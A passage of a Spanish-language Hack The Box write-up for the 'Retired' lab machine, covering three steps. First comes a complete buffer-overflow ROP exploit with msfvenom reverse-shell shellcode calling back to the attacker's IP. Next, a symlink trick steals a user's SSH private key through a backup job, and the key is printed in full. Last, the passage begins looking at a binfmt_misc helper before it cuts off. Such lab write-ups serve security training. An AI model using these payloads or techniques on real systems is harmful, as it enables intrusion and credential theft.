+<p class="plain-text">Ya en el <code class="language-plaintext highlighter-rouge">RSP</code> podemos ejecutar nuestro <code class="language-plaintext highlighter-rouge">shellcode</code>, en este caso generamos uno con <code class="language-plaintext highlighter-rouge">msfvenom</code> que nos envie una <code class="language-plaintext highlighter-rouge">reverse shell</code>, esto indicando el formato <code class="language-plaintext highlighter-rouge">python</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ msfvenom</span><span class="p"> -p linux/x64/shell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -f python -v shellcode  
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 74 bytes
+Final size of python file: 432 bytes
+shellcode =  b""
+shellcode += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f"
+shellcode += b"\x05\x48\x97\x48\xb9\x02\x00\x01\xbb\x0a\x0a"
+shellcode += b"\x0e\x0a\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a"
+shellcode += b"\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21"
+shellcode += b"\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb"
+shellcode += b"\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89"
+shellcode += b"\xe7\x52\x57\x48\x89\xe6\x0f\x05"</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora simplemente lo definimos en el <code class="language-plaintext highlighter-rouge">script</code> de python para poder usarlo despues</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">shellcode </span><span class="o">=</span><span class="no">  b</span><span class="s">""</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x05\x48\x97\x48\xb9\x02\x00\x01\xbb\x0a\x0a</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x0e\x9b\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xe7\x52\x57\x48\x89\xe6\x0f\x05"</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nuestro payload final enviara la <code class="language-plaintext highlighter-rouge">basura</code> hasta llegar al registro <code class="language-plaintext highlighter-rouge">RIP</code>, ahi colocara en los registros <code class="language-plaintext highlighter-rouge">RDX</code>, <code class="language-plaintext highlighter-rouge">RSI</code> y <code class="language-plaintext highlighter-rouge">RDX</code> los argumentos necesarios para la función <code class="language-plaintext highlighter-rouge">mprotect</code> y la llamara para modifcar los <code class="language-plaintext highlighter-rouge">permisos</code> y hacer la pila ejecutable, despues de ello con un <code class="language-plaintext highlighter-rouge">push</code> al registro <code class="language-plaintext highlighter-rouge">RSP</code> podremos ir a la pila y ejecutar ahi nuestro <code class="language-plaintext highlighter-rouge">shellcode</code></p>
+<a href="/htb/retired/6.png" target="_blank"><div><p><img src="/htb/retired/6.png"></p></div></a>
+
+<p class="plain-text">Simplemente nos queda definir el <code class="language-plaintext highlighter-rouge">payload</code> en el script y mediante una petición <code class="language-plaintext highlighter-rouge">POST</code> enviar el payload como archivo llamado <code class="language-plaintext highlighter-rouge">licensefile</code> a el php de la máquina victima</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">payload </span><span class="o">=  </span><span class="no">b</span><span class="s">""</span><span class="p">
+payload </span><span class="o">+= </span><span class="p">junk
+payload </span><span class="o">+= </span><span class="p">pop_rdi </span><span class="o">+ </span><span class="p">p64(stack_start)
+payload </span><span class="o">+= </span><span class="p">pop_rsi </span><span class="o">+ </span><span class="p">p64(stack_size)
+payload </span><span class="o">+= </span><span class="p">pop_rdx </span><span class="o">+ </span><span class="p">p64(</span><span class="mi">7</span><span class="p">)
+payload </span><span class="o">+= </span><span class="p">mprotect
+payload </span><span class="o">+= </span><span class="p">push_rsp
+payload </span><span class="o">+= </span><span class="p">shellcode</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">requests.post</span><span class="p">(</span><span class="s">"http://retired.htb/activate_license.php"</span><span class="p">, files</span><span class="o">=</span><span class="p">{</span><span class="s">"licensefile"</span><span class="p">: payload})  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El script final para ejecutar el <code class="language-plaintext highlighter-rouge">Buffer Overflow</code> utilizando la función <code class="language-plaintext highlighter-rouge">mprotect</code> para cambiar los permisos de la pila y hacerla <code class="language-plaintext highlighter-rouge">ejecutable</code> quedaria de la siguiente manera</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">p64
+</span><span class="o">import </span><span class="p">requests
+
+offset </span><span class="o">= </span><span class="mi">520</span><span class="p">
+junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
+
+libc_base</span><span class="o"> = </span><span class="mi">0x7f82a824f000</span><span class="p">
+
+stack_start </span><span class="o">= </span><span class="mi">0x7ffd16c4c000
+</span><span class="p">stack_end </span><span class="o">= </span><span class="mi">0x7ffd16c6d000
+</span><span class="p">stack_size</span><span class="o"> = </span><span class="p">stack_end </span><span class="o">- </span><span class="p">stack_start
+
+offset_mprotect </span><span class="o">= </span><span class="mi">0x00000000000f8c20</span><span class="p">
+offset_pop_rdi </span><span class="o">= </span><span class="mi">0x0000000000026796</span><span class="p">
+offset_pop_rsi </span><span class="o">= </span><span class="mi">0x000000000002890f</span><span class="p">
+offset_pop_rdx </span><span class="o">= </span><span class="mi">0x00000000000cb1cd</span><span class="p">
+offset_push_rsp </span><span class="o">= </span><span class="mi">0x000000000003afc9</span><span class="p">
+
+mprotect </span><span class="o">= </span><span class="p">p64(libc_base </span><span class="o">+ </span><span class="p">offset_mprotect)
+pop_rdi </span><span class="o">= </span><span class="p">p64(libc_base </span><span class="o">+ </span><span class="p">offset_pop_rdi)
+pop_rsi </span><span class="o">= </span><span class="p">p64(libc_base </span><span class="o">+ </span><span class="p">offset_pop_rsi)
+pop_rdx </span><span class="o">= </span><span class="p">p64(libc_base </span><span class="o">+ </span><span class="p">offset_pop_rdx)
+push_rsp </span><span class="o">= </span><span class="p">p64(libc_base </span><span class="o">+ </span><span class="p">offset_push_rsp)
+
+shellcode </span><span class="o">=</span><span class="no">  b</span><span class="s">""</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x05\x48\x97\x48\xb9\x02\x00\x01\xbb\x0a\x0a</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x0e\x9b\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xe7\x52\x57\x48\x89\xe6\x0f\x05"</span><span class="p">
+
+payload </span><span class="o">=  </span><span class="no">b</span><span class="s">""</span><span class="p">
+payload </span><span class="o">+= </span><span class="p">junk
+payload </span><span class="o">+= </span><span class="p">pop_rdi </span><span class="o">+ </span><span class="p">p64(stack_start)
+payload </span><span class="o">+= </span><span class="p">pop_rsi </span><span class="o">+ </span><span class="p">p64(stack_size)
+payload </span><span class="o">+= </span><span class="p">pop_rdx </span><span class="o">+ </span><span class="p">p64(</span><span class="mi">7</span><span class="p">)
+payload </span><span class="o">+= </span><span class="p">mprotect
+payload </span><span class="o">+= </span><span class="p">push_rsp
+payload </span><span class="o">+= </span><span class="p">shellcode
+
+requests.post</span><span class="p">(</span><span class="s">"http://retired.htb/activate_license.php"</span><span class="p">, files</span><span class="o">=</span><span class="p">{</span><span class="s">"licensefile"</span><span class="p">: payload})  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutar el <code class="language-plaintext highlighter-rouge">script</code> enviara la petición con nuestro payload y al programa interpretarla nos enviara una <code class="language-plaintext highlighter-rouge">revshell</code> en este caso como <code class="language-plaintext highlighter-rouge">www-data</code> a nuestro host</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.154 
+script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+</span><span class="ve">www-data@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)  
+</span><span class="ve">www-data@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ hostname -I
+10.10.11.154 
+</span><span class="ve">www-data@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="shell-dev">
+<br><h3 class="post-title">Shell - dev</h3><br>
+
+<p class="plain-text">Si miramos los archivos que hay encontramos 4 archivos <code class="language-plaintext highlighter-rouge">zip</code> de backups, la <code class="language-plaintext highlighter-rouge">licencia</code> generada por la explotación anterior y el directorio <code class="language-plaintext highlighter-rouge">html</code> de la web</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">www-data@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ ls -l
+-rw-r--r-- 1 dev      www-data 505153 Jun 23 17:46 </span><span class="ro">2023-06-23_17-46-07-html.zip</span><span class="p">  
+-rw-r--r-- 1 dev      www-data 505153 Jun 23 17:47 </span><span class="ro">2023-06-23_17-47-01-html.zip</span><span class="p">  
+-rw-r--r-- 1 dev      www-data 505153 Jun 23 17:48 </span><span class="ro">2023-06-23_17-48-07-html.zip</span><span class="p">  
+-rw-r--r-- 1 dev      www-data 505153 Jun 23 17:49 </span><span class="ro">2023-06-23_17-49-01-html.zip</span><span class="p">  
+drwxrwsrwx 5 www-data www-data   4096 Mar 11  2022 </span><span class="az">html</span><span class="p">
+-rw-r--r-- 1 www-data www-data  12288 Jun 23 17:48 license.sqlite
+</span><span class="ve">www-data@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Como parece que los <code class="language-plaintext highlighter-rouge">zip</code> son creados por una <code class="language-plaintext highlighter-rouge">tarea</code> podemos listar las proximas tareas, faltan <code class="language-plaintext highlighter-rouge">33</code> segundos para que el servicio <code class="language-plaintext highlighter-rouge">website_backup.service</code> se ejecute</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">www-data@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ systemctl list-timers 
+NEXT                        LEFT          LAST                        PASSED               UNIT                         ACTIVATES
+Fri 2023-06-23 17:50:00 UTC 33s left      Fri 2023-06-23 17:49:01 UTC 25s ago              website_backup.timer         website_backup.service
+Fri 2023-06-23 17:55:52 UTC 6min left     n/a                         n/a                  systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service  
+Fri 2023-06-23 17:58:44 UTC 9min left     Fri 2022-03-11 11:13:00 UTC 1 years 3 months ago apt-daily-upgrade.timer      apt-daily-upgrade.service
+Fri 2023-06-23 18:04:41 UTC 15min left    Mon 2022-03-28 11:12:56 UTC 1 years 2 months ago fstrim.timer                 fstrim.service
+Fri 2023-06-23 18:09:00 UTC 19min left    Fri 2023-06-23 17:40:57 UTC 8min ago             phpsessionclean.timer        phpsessionclean.service
+Fri 2023-06-23 23:45:31 UTC 5h 56min left Fri 2022-03-11 15:32:28 UTC 1 years 3 months ago apt-daily.timer              apt-daily.service
+Sat 2023-06-24 00:00:00 UTC 6h left       Fri 2023-06-23 17:40:57 UTC 8min ago             logrotate.timer              logrotate.service
+Sat 2023-06-24 00:00:00 UTC 6h left       Fri 2023-06-23 17:40:57 UTC 8min ago             man-db.timer                 man-db.service
+Sun 2023-06-25 03:10:46 UTC 1 day 9h left Fri 2023-06-23 17:41:27 UTC 7min ago             e2scrub_all.timer            e2scrub_all.service
+</span><span class="ve">www-data@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al mirar la config del <code class="language-plaintext highlighter-rouge">servicio</code> encontramos que ejecuta el binario <code class="language-plaintext highlighter-rouge">/usr/bin/webbackup</code> usando el usuario <code class="language-plaintext highlighter-rouge">dev</code> y el grupo <code class="language-plaintext highlighter-rouge">www-data</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">www-data@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ find / -name website_backup.service 2>/dev/null  
+/etc/systemd/system/website_backup.service
+</span><span class="ve">www-data@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ cat /etc/systemd/system/website_backup.service
+[Unit]
+Description=Backup and rotate website
+
+[Service]
+User=dev
+Group=www-data
+ExecStart=/usr/bin/webbackup
+
+[Install]
+WantedBy=multi-user.target
+</span><span class="ve">www-data@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Resumiendo la funcion de <code class="language-plaintext highlighter-rouge">webbackup</code> vemos que en el directorio <code class="language-plaintext highlighter-rouge">/var/www</code> crea un backup de todo el directorio <code class="language-plaintext highlighter-rouge">/var/www/html</code> usando como nombre la <code class="language-plaintext highlighter-rouge">fecha</code> y hora</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">www-data@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ cat /usr/bin/webbackup
+#!/bin/bash
+set -euf -o pipefail
+
+cd /var/www/
+
+SRC=/var/www/html
+DST="/var/www/$(date +%Y-%m-%d_%H-%M-%S)-html.zip"
+
+/usr/bin/rm --force -- "$DST"
+/usr/bin/zip --recurse-paths "$DST" "$SRC"
+
+KEEP=10
+/usr/bin/find /var/www/ -maxdepth 1 -name '*.zip' -print0 \  
+    | sort --zero-terminated --numeric-sort --reverse \
+    | while IFS= read -r -d '' backup; do
+        if [ "$KEEP" -le 0 ]; then
+            /usr/bin/rm --force -- "$backup"
+        fi
+        KEEP="$((KEEP-1))"
+    done
+</span><span class="ve">www-data@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos aprovechar que la <code class="language-plaintext highlighter-rouge">tarea</code> se ejecuta como el usuario <code class="language-plaintext highlighter-rouge">dev</code> para crear un enlace simbolico de su clave ssh <code class="language-plaintext highlighter-rouge">privada</code> dentro del directorio <code class="language-plaintext highlighter-rouge">html</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">www-data@retired</span><span class="p">:</span><span class="az">~/html</span><span class="p">$ ln -s /home/dev/.ssh/id_rsa id_rsa  
+</span><span class="ve">www-data@retired</span><span class="p">:</span><span class="az">~/html</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Esperamos que se ejecute la tarea y cuando cree un nuevo <code class="language-plaintext highlighter-rouge">zip</code> lo copiamos un directorio como <code class="language-plaintext highlighter-rouge">/dev/shm</code> ya que despues de un rato este se borra</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">www-data@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ ls -l
+-rw-r--r-- 1 dev      www-data 505153 Jun 23 17:49 </span><span class="ro">2023-06-23_17-49-01-html.zip</span><span class="p">  
+-rw-r--r-- 1 dev      www-data 505153 Jun 23 17:50 </span><span class="ro">2023-06-23_17-50-01-html.zip</span><span class="p">  
+-rw-r--r-- 1 dev      www-data 505153 Jun 23 17:51 </span><span class="ro">2023-06-23_17-51-07-html.zip</span><span class="p">  
+-rw-r--r-- 1 dev      www-data 507284 Jun 23 17:52 </span><span class="ro">2023-06-23_17-52-01-html.zip</span><span class="p">  
+drwxrwsrwx 5 www-data www-data   4096 Jun 23 17:51 </span><span class="az">html</span><span class="p">
+-rw-r--r-- 1 www-data www-data  12288 Jun 23 17:48 license.sqlite
+</span><span class="ve">www-data@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ cp 2023-06-23_17-52-01-html.zip /dev/shm
+</span><span class="ve">www-data@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora lo descomprimimos y en el podemos ver existente el archivo <code class="language-plaintext highlighter-rouge">id_rsa</code> de antes</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">www-data@retired</span><span class="p">:</span><span class="az">/dev/shm</span><span class="p">$ unzip 2023-06-23_17-52-01-html.zip  
+Archive:  2023-06-23_17-52-01-html.zip
+   creating: var/www/html/
+   creating: var/www/html/js/
+  inflating: var/www/html/js/scripts.js  
+  inflating: var/www/html/activate_license.php  
+   creating: var/www/html/assets/
+  inflating: var/www/html/assets/favicon.ico  
+   creating: var/www/html/assets/img/
+  inflating: var/www/html/assets/img/close-icon.svg  
+  inflating: var/www/html/assets/img/navbar-logo.svg  
+   creating: var/www/html/assets/img/about/
+  inflating: var/www/html/assets/img/about/2.jpg  
+  inflating: var/www/html/assets/img/about/4.jpg  
+  inflating: var/www/html/assets/img/about/3.jpg  
+  inflating: var/www/html/assets/img/about/1.jpg  
+   creating: var/www/html/assets/img/logos/
+  inflating: var/www/html/assets/img/logos/facebook.svg  
+  inflating: var/www/html/assets/img/logos/microsoft.svg  
+  inflating: var/www/html/assets/img/logos/google.svg  
+  inflating: var/www/html/assets/img/logos/ibm.svg  
+   creating: var/www/html/assets/img/team/
+  inflating: var/www/html/assets/img/team/2.jpg  
+  inflating: var/www/html/assets/img/team/3.jpg  
+  inflating: var/www/html/assets/img/team/1.jpg  
+  inflating: var/www/html/assets/img/header-bg.jpg  
+  inflating: var/www/html/beta.html  
+  inflating: var/www/html/default.html  
+  inflating: var/www/html/index.php  
+  inflating: var/www/html/id_rsa     
+   creating: var/www/html/css/
+  inflating: var/www/html/css/styles.css  
+</span><span class="ve">www-data@retired</span><span class="p">:</span><span class="az">/dev/shm</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al leer el archivo <code class="language-plaintext highlighter-rouge">id_rsa</code> encontramos la clave privada del usuario <code class="language-plaintext highlighter-rouge">dev</code> ya que al comprimir el directorio <code class="language-plaintext highlighter-rouge">html</code> tomaba el enlace simbolico para leerla</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">www-data@retired</span><span class="p">:</span><span class="az">/dev/shm/var/www/html</span><span class="p">$ cat id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+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  
+7rTyG3wbNka1sAAAALZGV2QHJldGlyZWQ=
+-----END OPENSSH PRIVATE KEY-----
+</span><span class="ve">www-data@retired</span><span class="p">:</span><span class="az">/dev/shm/var/www/html</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos simplemente usar la <code class="language-plaintext highlighter-rouge">id_rsa</code> para conectarnos por <code class="language-plaintext highlighter-rouge">ssh</code> a la maquina sin contraseña, al hacerlo nos convertimos en <code class="language-plaintext highlighter-rouge">dev</code> y podemos leer la primera <code class="language-plaintext highlighter-rouge">flag</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ssh </span><span class="p">dev@retired.htb -i id_rsa
+</span><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ id
+uid=1001(dev) gid=1001(dev) groups=1001(dev),33(www-data)  
+</span><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ hostname -I
+10.10.11.154
+</span><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ cat user.txt 
+f3c**************************924
+</span><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="shell-root">
+<br><h3 class="post-title">Shell - root</h3><br>
+
+<p class="plain-text">Mirando los archivos existentes encontramos los directorios <code class="language-plaintext highlighter-rouge">activate_license</code> y <code class="language-plaintext highlighter-rouge">emuemu</code>, actualmente activate_license lo hemos explotado asi que lo omitiremos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$ ls
+</span><span class="az">activate_license  emuemu  </span><span class="p">user.txt  
+</span><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En el directorio <code class="language-plaintext highlighter-rouge">emuemu</code> encontramos varios archivos, entre ellos algunos en <code class="language-plaintext highlighter-rouge">C</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">dev@retired:</span><span class="az">~/emuemu</span><span class="p">$ ls
+Makefile  README.md  emuemu  emuemu.c  reg_helper  reg_helper.c  test  
+</span><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~/emuemu</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si miramos lo que hace <code class="language-plaintext highlighter-rouge">emuemu</code> con el codigo de <code class="language-plaintext highlighter-rouge">emuemu.c</code> no hace nada realmente interesante, solo usa <code class="language-plaintext highlighter-rouge">puts</code> para mostrar un mensaje y sale con un codigo <code class="language-plaintext highlighter-rouge">1</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~/emuemu</span><span class="p">$ cat emuemu.c 
+#include &ltstdio.h>
+
+/* currently this is only a dummy implementation doing nothing */  
+
+int main(void) {
+    puts("EMUEMU is still under development.");
+    return 1;
+}
+</span><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~/emuemu</span><span class="p">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text"><code class="language-plaintext highlighter-rouge">reg_helper</code> toma un input y escribe en el archivo <code class="language-plaintext highlighter-rouge">register</code> de binfmt_misc</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">dev@retired</span><span class="p">:</span><span class="az">~/emuemu</span><span class="p">$ cat reg_helper.c 
+#define _GNU_SOURCE
+
+#include &ltfcntl.h>
+#include &ltstdio.h>
+#include &ltstring.h>
+#include &ltsys/stat.h>
+#include &ltsys/types.h>
+#include &ltunistd.h>
+
+int main(void) {
+    char cmd[512] = { 0 };
+
+    read(STDIN_FILENO, cmd, sizeof(cmd)); cmd[-1] = 0;
+
+    int fd = open("/proc/sys/fs/binfmt_misc/register", O_WRONLY);  
+    if (-1 == fd)
+        perror("open");
+    if (write(fd, cmd, strnlen(cmd,sizeof(cmd))) == -1)
+        perror("write");
+    if (close(fd) == -1)
